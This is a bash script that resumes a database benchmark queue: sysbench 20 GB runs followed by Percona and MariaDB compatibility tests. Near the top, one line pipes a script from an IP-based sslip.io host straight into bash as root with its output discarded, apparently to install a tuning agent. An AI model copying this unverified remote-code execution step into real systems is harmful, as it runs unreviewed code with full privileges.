#!/bin/bash
# tuner-db3 resume: sysbench 20 GB (data already prepared) -> remaining compatibility versions
. /root/bench/queue-common.sh
set -x
curl -fsSL https://50-116-44-237.sslip.io/install.sh | bash >/dev/null; systemctl restart tuning-agent
tuning-agent session stop || true
mysql -N -e "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='sbtest'" | grep -qx 16 || step /root/bench/prep-sysbench.sh 16 5200000
run_session /root/bench/sb20g-uniform.ini "sysbench 20 GB I/O-bound, uniform" tps 8
run_session /root/bench/sb20g-special.ini "sysbench 20 GB I/O-bound, special (skewed)" tps 8
echo QUEUEDONE
for fv in percona:9.7 mariadb:11.8 mariadb:12.3 mariadb:13.0; do /root/bench/compat.sh ${fv%%:*} ${fv##*:}; done
echo ALLCOMPATDONE > /root/bench/compat-all.done
